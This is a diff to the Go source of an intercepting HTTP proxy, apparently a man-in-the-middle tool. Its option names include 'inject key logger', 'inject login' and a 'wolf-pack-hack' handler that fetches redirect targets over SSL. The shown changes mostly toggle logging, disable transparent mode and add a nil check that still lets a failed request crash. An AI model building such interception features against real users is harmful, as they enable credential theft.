@@ -2,7 +2,7 @@ package controllers
 
 import (
     "github.com/abourget/goproxy"
-    // "log"
+    "log"
     "net/http"
     "strings"
     "bytes"
@@ -40,8 +40,8 @@ func StartSimpleProxy() {
 
     //log.Printintln(" >>> STARTING PROXY SERVER")
     //log.Printintln("     --- OPTION storing HAR ", globalStoreHAR )
-    //log.Printintln("     --- OPTION redirection ", globalRedirects )
-    //log.Printintln("     --- OPTION blocking ", globalBlocks )
+    log.Println("     --- OPTION redirection ", globalRedirects )
+    log.Println("     --- OPTION blocking ", globalBlocks )
     //log.Printintln("     --- OPTION wolf-pack-hack ", globalWolfPack )
     //log.Printintln("     --- OPTION inject key logger ", globalInjectKeyLogger )
     //log.Printintln("     --- OPTION inject login ", globalInjectGetLogin )
@@ -54,20 +54,20 @@ func StartSimpleProxy() {
     proxy := goproxy.NewProxyHttpServer()
 
     //useful for debugging
-    proxy.Verbose = false
+    proxy.Verbose = true
 
-    //transparency
-    proxy.NonProxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
-        ////log.Printintln(req.URL.Scheme)
-        if req.Host == "" {
-            //log.Printintln(w, "Cannot handle requests without Host header, e.g., HTTP 1.0")
-            return
-        }
-            req.URL.Scheme = "http"    
+    //transparency - turn on in live mode
+    // proxy.NonProxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
+    //     ////log.Printintln(req.URL.Scheme)
+    //     if req.Host == "" {
+    //         //log.Printintln(w, "Cannot handle requests without Host header, e.g., HTTP 1.0")
+    //         return
+    //     }
+    //         req.URL.Scheme = "http"    
         
-        req.URL.Host = req.Host
-        proxy.ServeHTTP(w, req)
-    })
+    //     req.URL.Host = req.Host
+    //     proxy.ServeHTTP(w, req)
+    // })
     // Check if we are BLOCKING this page.
 
 
@@ -189,7 +189,7 @@ func TriggerRedirect() goproxy.HandlerFunc {
 
 // //
 func TriggerBlock() goproxy.HandlerFunc {
-    //log.Printintln("blocker")
+    log.Println("blocker")
     // Create a new pageBlocker handler function to pass back later on.
     pageBlocker := goproxy.HandlerFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
         // Create the body, very naieve for now.
@@ -229,6 +229,9 @@ func TriggerWolfPack() goproxy.HandlerFunc {
                 server_ssl_response, err := client.Get( ctx.Resp.Header.Get("Location") )
                 if err != nil {
                     //log.Printintln(" help!: ", err)
+                }
+                if server_ssl_response.Body == nil { 
+                    return goproxy.FORWARD
                 }
                 bs, err := ioutil.ReadAll(server_ssl_response.Body)
                 if err != nil {
